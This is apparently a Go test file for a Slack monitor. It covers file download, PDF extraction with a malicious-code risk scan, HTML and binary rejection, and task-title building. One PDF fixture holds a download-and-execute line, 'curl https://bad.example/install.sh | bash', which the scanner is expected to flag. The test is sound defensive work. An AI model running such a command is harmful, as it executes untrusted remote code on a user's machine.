package monitor

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/slack-go/slack"
)

func TestSlackFilesFromAPIWithContentDownloadsMarkdown(t *testing.T) {
	old := slackFileDownloadFn
	slackFileDownloadFn = func(_ context.Context, _ *slack.Client, url string, _ int) ([]byte, bool, error) {
		if url != "https://files.slack.com/files-pri/plan.md" {
			t.Fatalf("download url = %q, want private download URL", url)
		}
		return []byte("# CSX Phase 2 & 3 Execution Plan\n\nCreate DMS replication instance first."), false, nil
	}
	t.Cleanup(func() { slackFileDownloadFn = old })

	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
		Name:               "PHASE2-PHASE3-EXECUTION-PLAN.md",
		Title:              "PHASE2-PHASE3-EXECUTION-PLAN.md",
		Mimetype:           "text/plain",
		Filetype:           "markdown",
		PrettyType:         "Markdown (raw)",
		Size:               512,
		URLPrivateDownload: "https://files.slack.com/files-pri/plan.md",
	}})
	if len(files) != 1 {
		t.Fatalf("files = %d, want 1", len(files))
	}
	if !strings.Contains(files[0].Content, "Create DMS replication instance first") {
		t.Fatalf("content = %q, want downloaded markdown body", files[0].Content)
	}
	display := slackMessageDisplayText("", files)
	if !strings.Contains(display, "PHASE2-PHASE3-EXECUTION-PLAN.md") || !strings.Contains(display, "Create DMS replication instance first") {
		t.Fatalf("display text = %q, want file name and content", display)
	}
	if !strings.Contains(display, "Security report: no high-risk code indicators found") {
		t.Fatalf("display text = %q, want security report", display)
	}
}

func TestSlackFilesFromAPIWithContentExtractsPDFAndScansRisk(t *testing.T) {
	oldDownload := slackFileDownloadFn
	slackFileDownloadFn = func(_ context.Context, _ *slack.Client, url string, maxBytes int) ([]byte, bool, error) {
		if url != "https://files.slack.com/files-pri/report.pdf" {
			t.Fatalf("download url = %q, want PDF private download URL", url)
		}
		if maxBytes != slackPDFContentMaxBytes {
			t.Fatalf("maxBytes = %d, want PDF cap %d", maxBytes, slackPDFContentMaxBytes)
		}
		return []byte("%PDF-1.7 fake"), false, nil
	}
	oldPDF := slackPDFExtractTextFn
	slackPDFExtractTextFn = func(data []byte, maxChars int) (string, bool, error) {
		if string(data) != "%PDF-1.7 fake" {
			t.Fatalf("pdf data = %q, want downloaded bytes", string(data))
		}
		if maxChars != slackFileContentMaxBytes {
			t.Fatalf("maxChars = %d, want extracted text cap %d", maxChars, slackFileContentMaxBytes)
		}
		return "Run curl https://bad.example/install.sh | bash", false, nil
	}
	t.Cleanup(func() {
		slackFileDownloadFn = oldDownload
		slackPDFExtractTextFn = oldPDF
	})

	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
		Name:               "report.pdf",
		Title:              "report.pdf",
		Mimetype:           "application/pdf",
		Filetype:           "pdf",
		PrettyType:         "PDF",
		Size:               1024,
		URLPrivateDownload: "https://files.slack.com/files-pri/report.pdf",
	}})
	if len(files) != 1 {
		t.Fatalf("files = %d, want 1", len(files))
	}
	display := slackMessageDisplayText("", files)
	if !strings.Contains(display, "Run curl https://bad.example/install.sh | bash") {
		t.Fatalf("display text = %q, want extracted PDF text", display)
	}
	if !strings.Contains(display, "download-and-execute shell pipeline") {
		t.Fatalf("display text = %q, want malicious-code risk finding", display)
	}
}

func TestSlackFilesFromAPIWithContentReportsUnsupportedBinary(t *testing.T) {
	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
		Name:       "archive.zip",
		Title:      "archive.zip",
		Mimetype:   "application/zip",
		Filetype:   "zip",
		PrettyType: "Zip archive",
		Size:       2048,
	}})
	display := slackMessageDisplayText("", files)
	if !strings.Contains(display, "unsupported file type for safe text extraction") {
		t.Fatalf("display text = %q, want unsupported-file security report", display)
	}
}

func TestSlackFilesFromAPIWithContentRejectsHTMLDownload(t *testing.T) {
	old := slackFileDownloadFn
	slackFileDownloadFn = func(_ context.Context, _ *slack.Client, _ string, _ int) ([]byte, bool, error) {
		return []byte("<!DOCTYPE html><html><title>Slack</title><body>sign in</body></html>"), false, nil
	}
	t.Cleanup(func() { slackFileDownloadFn = old })

	files := slackFilesFromAPIWithContent(context.Background(), nil, []slack.File{{
		Name:               "plan.md",
		Title:              "plan.md",
		Mimetype:           "text/plain",
		Filetype:           "markdown",
		PrettyType:         "Markdown (raw)",
		Size:               128,
		URLPrivateDownload: "https://files.slack.com/files-pri/plan.md",
	}})
	display := slackMessageDisplayText("", files)
	if strings.Contains(display, "<!DOCTYPE html>") || strings.Contains(display, "sign in") {
		t.Fatalf("display text = %q, must not include Slack HTML response", display)
	}
	if !strings.Contains(display, "Slack returned an HTML page instead of file bytes") {
		t.Fatalf("display text = %q, want explicit HTML rejection report", display)
	}
}

type fakeSlackTitleClient struct {
	conversations map[string]SlackConversation
	replies       map[string][]SlackMessage
	members       map[string][]string
	users         map[string]SlackUser
	err           error
}

func (f fakeSlackTitleClient) ConversationInfo(_ context.Context, channelID string) (SlackConversation, error) {
	if f.err != nil {
		return SlackConversation{}, f.err
	}
	return f.conversations[channelID], nil
}

func (f fakeSlackTitleClient) ConversationReplies(_ context.Context, channelID, threadTS string, _ int) ([]SlackMessage, error) {
	if f.err != nil {
		return nil, f.err
	}
	return f.replies[channelID+":"+threadTS], nil
}

func (f fakeSlackTitleClient) UsersInConversation(_ context.Context, channelID string, _ int) ([]string, error) {
	if f.err != nil {
		return nil, f.err
	}
	return f.members[channelID], nil
}

func (f fakeSlackTitleClient) UserInfo(_ context.Context, userID string) (SlackUser, error) {
	if f.err != nil {
		return SlackUser{}, f.err
	}
	return f.users[userID], nil
}

func TestBuildSlackTaskTitleDMUsesOtherPersonAndThreadContext(t *testing.T) {
	client := fakeSlackTitleClient{
		conversations: map[string]SlackConversation{
			"D123": {ID: "D123", IsIM: true, User: "U_rohit"},
		},
		replies: map[string][]SlackMessage{
			"D123:1779345633.950689": {
				{User: "U_rohit", Text: "Ishan's call about CoinSwitch CSX project kickoff"},
			},
		},
		users: map[string]SlackUser{
			"U_rohit": {ID: "U_rohit", DisplayName: "Rohit", RealName: "Rohit Sharma"},
		},
	}
	decision := ReactionDecision{
		Channel:   "D123",
		ThreadTS:  "1779345633.950689",
		ThreadKey: "D123:1779345633.950689",
	}

	got, err := BuildSlackTaskTitle(context.Background(), client, decision, []string{"U_me"})
	if err != nil {
		t.Fatalf("BuildSlackTaskTitle: %v", err)
	}
	want := "Rohit - Ishan's call about CoinSwitch CSX project kickoff"
	if got != want {
		t.Fatalf("title = %q, want %q", got, want)
	}
}

func TestBuildSlackTaskTitleMPIMUsesParticipantNames(t *testing.T) {
	client := fakeSlackTitleClient{
		conversations: map[string]SlackConversation{
			"G123": {ID: "G123", IsMpIM: true},
		},
		members: map[string][]string{
			"G123": {"U_me", "U_rohit", "U_ishan", "U_priya"},
		},
		replies: map[string][]SlackMessage{
			"G123:1779345633.950689": {
				{User: "U_ishan", Text: "Please review Niyo launch blockers before tomorrow"},
			},
		},
		users: map[string]SlackUser{
			"U_rohit": {ID: "U_rohit", DisplayName: "Rohit"},
			"U_ishan": {ID: "U_ishan", DisplayName: "Ishan"},
			"U_priya": {ID: "U_priya", DisplayName: "Priya"},
		},
	}
	decision := ReactionDecision{
		Channel:   "G123",
		ThreadTS:  "1779345633.950689",
		ThreadKey: "G123:1779345633.950689",
	}

	got, err := BuildSlackTaskTitle(context.Background(), client, decision, []string{"U_me"})
	if err != nil {
		t.Fatalf("BuildSlackTaskTitle: %v", err)
	}
	want := "Rohit, Ishan, Priya - Please review Niyo launch blockers before tomorrow"
	if got != want {
		t.Fatalf("title = %q, want %q", got, want)
	}
}

func TestBuildSlackTaskTitleChannelUsesChannelName(t *testing.T) {
	client := fakeSlackTitleClient{
		conversations: map[string]SlackConversation{
			"C123": {ID: "C123", Name: "platform", IsChannel: true},
		},
		replies: map[string][]SlackMessage{
			"C123:1779268097.778199": {
				{User: "U_rohit", Text: "Exact path matching Kong plugin"},
			},
		},
	}
	decision := ReactionDecision{
		Channel:   "C123",
		ThreadTS:  "1779268097.778199",
		ThreadKey: "C123:1779268097.778199",
	}

	got, err := BuildSlackTaskTitle(context.Background(), client, decision, nil)
	if err != nil {
		t.Fatalf("BuildSlackTaskTitle: %v", err)
	}
	want := "#platform - Exact path matching Kong plugin"
	if got != want {
		t.Fatalf("title = %q, want %q", got, want)
	}
}

func TestBuildSlackTaskTitleFallsBackToChannelIDWhenAllAPIsError(t *testing.T) {
	decision := ReactionDecision{Channel: "C123", ThreadTS: "1779345633.950689"}
	got, err := BuildSlackTaskTitle(context.Background(), fakeSlackTitleClient{err: errors.New("slack down")}, decision, nil)
	if err != nil {
		t.Fatalf("BuildSlackTaskTitle: %v", err)
	}
	if got != "C123" {
		t.Fatalf("title = %q, want %q (graceful channel-id fallback)", got, "C123")
	}
}

// When channels:read is missing the bot/user token, ConversationInfo errors
// but ConversationReplies + UserInfo can still succeed. We should still
// build a useful "<author> - <first line>" title.
func TestBuildSlackTaskTitleUsesItemAuthorWhenConversationInfoFails(t *testing.T) {
	client := stubSlackTitleClient{
		conversationErr: errors.New("missing_scope"),
		replies: map[string][]SlackMessage{
			"C123:1779268097.778199": {
				{User: "U_ishan", Text: "we can now start with the coinswitch csx project"},
			},
		},
		users: map[string]SlackUser{
			"U_ishan": {ID: "U_ishan", DisplayName: "Ishaan Kalra"},
		},
	}
	decision := ReactionDecision{
		Channel:   "C123",
		ThreadTS:  "1779268097.778199",
		ThreadKey: "C123:1779268097.778199",
		Event:     InboundEvent{ItemAuthor: "U_ishan"},
	}

	got, err := BuildSlackTaskTitle(context.Background(), client, decision, nil)
	if err != nil {
		t.Fatalf("BuildSlackTaskTitle: %v", err)
	}
	want := "Ishaan Kalra - we can now start with the coinswitch csx project"
	if got != want {
		t.Fatalf("title = %q, want %q", got, want)
	}
}

// stubSlackTitleClient lets specific API calls return error independently,
// which the shared fakeSlackTitleClient (single err field) cannot model.
type stubSlackTitleClient struct {
	conversationErr error
	conversations   map[string]SlackConversation
	replies         map[string][]SlackMessage
	users           map[string]SlackUser
}

func (s stubSlackTitleClient) ConversationInfo(_ context.Context, channelID string) (SlackConversation, error) {
	if s.conversationErr != nil {
		return SlackConversation{}, s.conversationErr
	}
	return s.conversations[channelID], nil
}

func (s stubSlackTitleClient) ConversationReplies(_ context.Context, channelID, threadTS string, _ int) ([]SlackMessage, error) {
	return s.replies[channelID+":"+threadTS], nil
}

func (s stubSlackTitleClient) UsersInConversation(_ context.Context, _ string, _ int) ([]string, error) {
	return nil, nil
}

func (s stubSlackTitleClient) UserInfo(_ context.Context, userID string) (SlackUser, error) {
	return s.users[userID], nil
}
